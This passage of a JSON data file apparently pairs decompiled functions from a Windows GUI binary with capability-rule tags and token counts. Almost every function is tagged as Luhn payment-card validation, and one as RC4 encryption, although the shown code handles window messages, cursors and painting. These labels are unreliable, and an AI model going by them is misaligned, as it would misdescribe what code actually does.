        "decompiled_code": "\nvoid fcn.0045e9b0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45ea1d;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xf4))();\n    if (cVar1 != '\\0') {\n        fcn.00404154();\n        if ((cVar1 != '\\0') == true) {\n            fcn.0045eb24();\n        }\n    }\n    else {\n        in_EAX[0xa5] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 203
    },
    "0045f668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f668(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.0044bb7c();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 67
    },
    "0045f8e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045f8e8(void)\n\n{\n    uint uStack20;\n    \n    fcn.0045f950();\n    return uStack20;\n}\n",
        "token_count": 37
    },
    "0045f900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0045f900(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.0045f950();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "0045f91c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0045f91c(void)\n\n{\n    uint uStack16;\n    \n    fcn.0045f950();\n    return uStack16;\n}\n",
        "token_count": 36
    },
    "0045f934": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0045f934(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.0045f950();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 51
    },
    "0045f950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f950(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x4929b8)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 137
    },
    "0045f980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f980(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x4929b8)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 149
    },
    "0046016c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046016c(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t aiStack28 [3];\n    \n    piVar6 = aiStack28;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(aiStack28);\n            iVar1 = sub.user32.dll_WindowFromPoint(piVar6, aiStack28[0]);\n            if (iVar1 != 0) {\n                iVar2 = func_0x004074d4(iVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = sub.user32.dll_SendMessageA(iVar1, 0x84, 0, piVar6 & 0xffff | aiStack28[0] << 0x10);\n                    sub.user32.dll_SendMessageA(iVar1, 0x20, iVar1, uVar4 & 0xffff | 0x2000000);\n                    return;\n                }\n            }\n        }\n        uVar5 = fcn.00460144();\n        sub.user32.dll_SetCursor(uVar5);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 370
    },
    "0046038c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046038c(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        iVar2 = fcn.0045a3a4();\n        uVar1 = fcn.0045a3a4();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x02') {\n        iVar3 = fcn.0045a3a4();\n        iVar2 = *(param_2 + 0x4c);\n        iVar4 = fcn.0045a3a4();\n        uVar1 = iVar4 + *(in_EAX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x03') {\n        iVar2 = fcn.0045a384();\n        uVar1 = fcn.0045a384();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x04') {\n        iVar3 = fcn.0045a384();\n        iVar2 = *(param_2 + 0x48);\n        iVar4 = fcn.0045a384();\n        uVar1 = iVar4 + *(in_EAX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 400
    },
    "00460778": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460778(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uStack28 = 0x46078d;\n    cVar1 = fcn.00460720(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        fcn.00403f28();\n        uStack28 = 0x4607f2;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        fcn.004605d0(&stack0xfffffffc);\n        fcn.004605d0(&stack0xfffffffc);\n        fcn.004605d0(&stack0xfffffffc);\n        fcn.004605d0(&stack0xfffffffc);\n        fcn.004605d0(&stack0xfffffffc);\n        *in_FS_OFFSET = uStack32;\n        uStack28 = 0x4607f1;\n        fcn.00403f58();\n        return;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00461664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461664(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpPaint;\n    \n    uVar1 = sub.user32.dll_BeginPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    uVar2 = fcn.00461dc4();\n    sub.user32.dll_DrawIcon(uVar1, 0, 0, uVar2);\n    sub.user32.dll_EndPaint(*(*(arg_8h + -4) + 0x30), &lpPaint);\n    return;\n}\n",
        "token_count": 133
    },
    "004620d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004620d0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_stack_ffffffcc;\n    uchar *puVar5;\n    uchar *puStack28;\n    uchar auStack24 [8];\n    \n    uVar4 = 0;\n    if ((0xff < param_2[1]) && (param_2[1] < 0x10a)) {\n        puStack28 = 0x4620fb;\n        iVar2 = sub.user32.dll_GetCapture();\n        if (iVar2 == 0) {\n            iVar2 = *param_2;\n            if ((*(in_EAX + 0x44) == 0) || (iVar2 != *(*(in_EAX + 0x44) + 0x29c))) {\n                while( true ) {\n                    cVar1 = fcn.00442030();\n                    if ((cVar1 != '\\0') || (iVar2 == 0)) break;\n                    iVar2 = sub.user32.dll_GetParent();\n                }\n                if (iVar2 == 0) {\n                    iVar2 = *param_2;\n                }\n            }\n            else {\n                puStack28 = 0x462117;\n                iVar2 = fcn.0044d1c8();\n            }\n            iVar3 = sub.user32.dll_IsWindowUnicode(iVar2);\n            if (iVar3 == 0) {\n                in_stack_ffffffcc = param_2[1] + 0xbc00;\n                iVar2 = func_0x00407634(iVar2, in_stack_ffffffcc, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n            else {\n                in_stack_ffffffcc = param_2[1] + 0xbc00;\n                iVar2 = sub.user32.dll_SendMessageW(iVar2, in_stack_ffffffcc, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n        else {\n            puStack28 = &stack0xffffffe8;\n            sub.user32.dll_GetWindowThreadProcessId(iVar2);\n            puVar5 = *(in_EAX + 0x30);\n            sub.user32.dll_GetWindowThreadProcessId();\n            if (puVar5 == &stack0xffffffe4) {\n                in_stack_ffffffcc = param_2[1] + 0xbc00;\n                iVar2 = sub.user32.dll_SendMessageA(iVar2, in_stack_ffffffcc, param_2[2], param_2[3]);\n                if (iVar2 != 0) {\n                    uVar4 = 1;\n                }\n            }\n        }\n    }\n    return CONCAT44(in_stack_ffffffcc, uVar4);\n}\n",
        "token_count": 656
    },
    "00462414": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00462414(void)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00462300();\n    if (cVar1 == '\\0') {\n        fcn.00462e48();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "00462dbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00462dbc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack12 [8];\n    \n    sub.user32.dll_GetCursorPos(auStack12);\n    iVar1 = fcn.00443aec();\n    if (iVar1 != *(in_EAX + 0x48)) {\n        *(in_EAX + 0x48) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00463368": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463368(void)\n\n{\n    int32_t in_EAX;\n    uchar auStack12 [8];\n    \n    fcn.00463220();\n    if (*(in_EAX + 0x89) == '\\0') {\n        sub.user32.dll_GetCursorPos(auStack12);\n        fcn.004636b4();\n    }\n    else if (*(in_EAX + 0x89) == '\\x01') {\n        fcn.004633a0();\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "004654e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004654e8(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_DL = extraout_DL;\n    }\n    fcn.00453218(arg_8h);\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 0x80) = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "00465614": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00465614(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    uVar1 = fcn.00403f28();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 167
    },
    "0046647c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0046647c(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h\n            , uint arg_24h, uint arg_28h)\n\n{\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00466138(arg_ch, arg_8h, &var_ch, arg_18h, arg_1ch, arg_20h & 0xff, arg_24h, arg_28h);\n    fcn.00465eec(arg_10h & 0xff, arg_14h & 0xff);\n    fcn.00466048(arg_ch, arg_14h & 0xff, arg_8h);\n    return;\n}\n",
        "token_count": 186
    },
    "00467480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00467480(void)\n\n{\n    char cVar1;\n    \n    cVar1 = '\\v';\n    do {\n        fcn.00403f58();\n        cVar1 = cVar1 + -1;\n    } while (cVar1 != '\\0');\n    return;\n}\n",
        "token_count": 65
    },
    "004677e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004677e4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x46785b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x467823;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.0044f29c();\n    *in_FS_OFFSET = uStack48;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x467862;\n    uStack32 = 0x46785a;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 228
    },
    "0046786c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046786c(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack44 = 0x467886;\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    uStack48 = 0x467b21;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &fcn.0046786c::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.00436a14();\n    fcn.00428070();\n    fcn.00404df4();\n    piVar1 = fcn.004347b0();\n    in_EAX[0x30] = piVar1;\n    (**(*piVar1 + 0x18))();\n    fcn.004455dc();\n    (**(*piVar1 + 0x88))(200, 0xa9);\n    fcn.00434c38();\n    fcn.00434c70();\n    fcn.0044d480();\n    piVar1 = fcn.0042d014();\n    in_EAX[0x31] = piVar1;\n    (**(*piVar1 + 0x18))();\n    fcn.004455dc();\n    (**(*piVar1 + 0x88))(0x17, 0x9d);\n    fcn.004448f8();\n    (**(*piVar1 + 0x60))();\n    (**(*piVar1 + 0x6c))();\n    piVar1 = fcn.004666a8();\n    in_EAX[0x32] = piVar1;\n    (**(*piVar1 + 0x18))();\n    (**(*piVar1 + 0x88))(0x16, 0x17);\n    (**(*piVar1 + 0x68))();\n    fcn.00466e9c();\n    fcn.00426af0();\n    fcn.00406a50();\n    fcn.00445720();\n    fcn.004456fc();\n    piVar1[0x45] = in_EAX;\n    piVar1[0x44] = *(*in_EAX + 0x48);\n    (**(*piVar1 + 0x6c))();\n    piVar1 = fcn.004347b0();\n    in_EAX[0x33] = piVar1;\n    (**(*piVar1 + 0x18))();\n    fcn.004455dc();\n    uVar3 = 0x91;\n    (**(*piVar1 + 0x88))(0x91, 0x9d);\n    fcn.004448f8();\n    fcn.00434c1c();\n    fcn.00434c38();\n    fcn.0044d480();\n    iVar2 = fcn.00433b98();\n    in_EAX[0x34] = iVar2;\n    (**(*piVar1 + 0x6c))();\n    piVar1 = in_EAX[0x34];\n    (**(*piVar1 + 0x18))();\n    fcn.004448f8();\n    piVar1[0x47] = in_EAX;\n    piVar1[0x46] = *(*in_EAX + 0x48);\n    (**(*piVar1 + 0x6c))();\n    fcn.00433fcc();\n    fcn.00433f9c();\n    fcn.00433f74();\n    *(piVar1 + 0x1aa) = 1;\n    *in_FS_OFFSET = uVar3;\n    fcn.00404da0(0x467b28);\n    return;\n}\n",
        "token_count": 945
    },
    "00467be8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00467be8(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint *arg_8h;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_ch = 0;\n    var_4h = 0;\n    uVar3 = 1;\n    uStack64 = 0x467dc8;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x467c1e;\n    var_8h = in_EAX;\n    fcn.004372f8();\n    puStack72 = 0x467c2f;\n    fcn.004051b0();\n    if (uVar3) goto code_r0x00467d90;\n    puStack72 = 0x467c45;\n    fcn.00404df4();\n    puStack72 = 0x467c4d;\n    cVar2 = fcn.00409318();\n    if (cVar2 == '\\0') {\ncode_r0x00467c5d:\n        bVar1 = false;\n    }\n    else {\n        puStack72 = 0x467c59;\n        cVar2 = fcn.00467bd0();\n        if (cVar2 == '\\0') goto code_r0x00467c5d;\n        bVar1 = true;\n    }\n    if (bVar1) {\n        uStack76 = 0x467d24;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.00423f74();\n        arg_8h = &fcn.00467be8::var_ch;\n        fcn.00406a50();\n        fcn.00424424(0);\n        fcn.0042443c();\n        fcn.00409c80(arg_8h);\n        fcn.004455dc();\n        (**(**(var_8h + 200) + 0x68))();\n        fcn.004455dc();\n        *in_FS_OFFSET = uStack80;\n    }\n    else {\n        puStack72 = 0x467d41;\n        fcn.00406a50();\n        puStack72 = 0x467d52;\n        fcn.004455dc();\n        puStack72 = 0x467d62;\n        (**(**(var_8h + 200) + 0x68))();\n        puStack72 = 0x467d72;\n        fcn.00433f8c();\n        puStack72 = 0x467d7f;\n        fcn.00406a50();\n        puStack72 = 0x467d90;\n        fcn.004455dc();\n    }\ncode_r0x00467d90:\n    puStack72 = 0x467d98;\n    fcn.00436c24();\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x467dcf;\n    uStack64 = 0x467db2;\n    fcn.00404dc4();\n    uStack64 = 0x467dbf;\n    fcn.00404dc4();\n    uStack64 = 0x467dc7;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 864
    },
    "00467dec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00467dec(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x467ec4;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack72;\n    iVar1 = in_EAX[0xf];\n    sub.user32.dll_GetClientRect(iVar1, &var_10h);\n    (**(*in_EAX + 0x44))();\n    var_ch = var_ch + 4;\n    fcn.00444edc();\n    fcn.00444ebc();\n    fcn.00444c04();\n    fcn.00433f8c();\n    fcn.00404da0();\n    fcn.00406a50();\n    fcn.004455dc();\n    fcn.0044a0d8();\n    fcn.0043697c();\n    *in_FS_OFFSET = iVar1;\n    iStack72 = 0x467ecb;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 319
    },
    "00467f04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00467f04(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x468171;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x467f30;\n    piVar1 = fcn.004598c0();\n    uStack44 = 0x468154;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    (**(*piVar1 + 0x18))();\n    fcn.0045a7f4();\n    fcn.00406a50();\n    fcn.004455dc();\n    fcn.0045b58c();\n    *(piVar1 + 0x275) = 1;\n    fcn.0045be34();\n    piVar1[0x85] = in_EAX;\n    piVar1[0x84] = 0x4681b4;\n    piVar2 = fcn.004347b0();\n    (**(*piVar2 + 0x18))();\n    fcn.004455dc();\n    fcn.004448f8();\n    fcn.00434c38();\n    fcn.00434c8c();\n    fcn.00434c70();\n    fcn.0044574c();\n    (**(*piVar2 + 0x6c))();\n    *(piVar2 + 0x90) = 1;\n    piVar2 = fcn.00433b98();\n    (**(*piVar2 + 0x18))();\n    fcn.004448f8();\n    fcn.00433f9c();\n    fcn.00433fcc();\n    fcn.00433f74();\n    (**(*piVar2[0x66] + 8))();\n    (**(*piVar2 + 0x6c))();\n    iVar3 = fcn.00424424();\n    if (0 < iVar3) {\n        fcn.0045b858();\n        fcn.0045f934();\n        fcn.00444f18();\n        fcn.00444f18();\n        fcn.00424424();\n        fcn.0045a78c();\n        fcn.0045b858();\n        fcn.0045f900();\n        fcn.00444f5c();\n        fcn.00444f5c();\n        fcn.0042443c();\n        fcn.0045a7c0();\n    }\n    (**(*piVar1 + 0xfc))();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x46815b;\n    uStack44 = 0x468153;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 719
    },
    "00468658": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00468658(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x4686b4;\n    *(in_EAX + 0x250) = *0x4686b8;\n    *(in_EAX + 0x251) = 1;\n    *(in_EAX + 0x252) = 2;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 215
    },
    "00468874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00468874(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    uStack16 = 0x468885;\n    var_4h = in_EAX;\n    uStack16 = fcn.0044d1c8();\n    puStack20 = 0x46888b;\n    var_8h = sub.user32.dll_GetWindowDC();\n    uStack24 = 0x4688ca;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    (**(*var_4h + 0xd8))();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4688d1;\n    uStack24 = var_8h;\n    uStack28 = 0x4688c3;\n    uStack28 = fcn.0044d1c8();\n    sub.user32.dll_ReleaseDC();\n    return;\n}\n",
        "token_count": 265
    },
    "0046cd6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cd6c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x46cdf8;\n    iStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar1 = fcn.0044d1c8(0x1308, param_2, 0);\n    arg_8h = 0x46cda4;\n    iVar2 = sub.user32.dll_SendMessageA(uVar1);\n    if (iVar2 == 0) {\n        arg_8h = &fcn.0046cd6c::var_4h;\n        fcn.00406a50();\n        fcn.00409c80(arg_8h);\n        fcn.0046cce4();\n    }\n    fcn.0046dab8();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4(0x46cdff);\n    return;\n}\n",
        "token_count": 315
    },
    "0046cf1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046cf1c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    uStack64 = 0x46cfac;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_1ch = 8;\n    uVar1 = fcn.0044d1c8(0x1305, param_2, &fcn.0046cf1c::var_1ch);\n    arg_8h = 0x46cf5d;\n    iVar2 = sub.user32.dll_SendMessageA(uVar1);\n    if (iVar2 == 0) {\n        arg_8h = &fcn.0046cf1c::var_20h;\n        fcn.00406a50();\n        fcn.00409c80(arg_8h);\n        fcn.0046cce4();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4(0x46cfb3);\n    return;\n}\n",
        "token_count": 341
    },
    "0046d09c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
